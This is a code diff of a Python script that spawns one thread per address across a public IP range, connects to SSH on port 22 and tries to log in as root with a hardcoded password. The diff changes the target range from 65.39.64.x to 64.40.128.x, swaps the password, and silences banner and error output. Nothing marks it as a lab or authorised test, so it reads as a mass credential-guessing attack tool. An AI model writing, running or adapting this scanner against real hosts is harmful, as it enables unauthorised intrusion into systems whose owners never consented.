@@ -48,11 +48,12 @@ class Worker(threading.Thread):
             cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             cli.settimeout(5)
             cli.connect((self.ip, self.port))
-            banner = cli.recv(1024)
-            print("[INFO] %s\t%s"% (self.ip, banner))
+            # banner = cli.recv(1024)
+            # print("[INFO] %s\t%s"% (self.ip, banner))
             self.login()
-        except Exception:
+        except Exception as e:
             pass
+            # print("[ERROR] %s\t%s"% (self.ip, e))
 
     def login(self):
         try:
@@ -67,9 +68,9 @@ class Worker(threading.Thread):
 
 
 def main():
-    ip_range = generate_hosts("65.39.64.1", "65.39.64.254")
+    ip_range = generate_hosts("64.40.128.1", "64.40.128.254")
     for ip in ip_range:
-        bot = Worker(ip, 22, "root", "12345Qwerty!")
+        bot = Worker(ip, 22, "root", "r00t")
         bot.start()
 
 
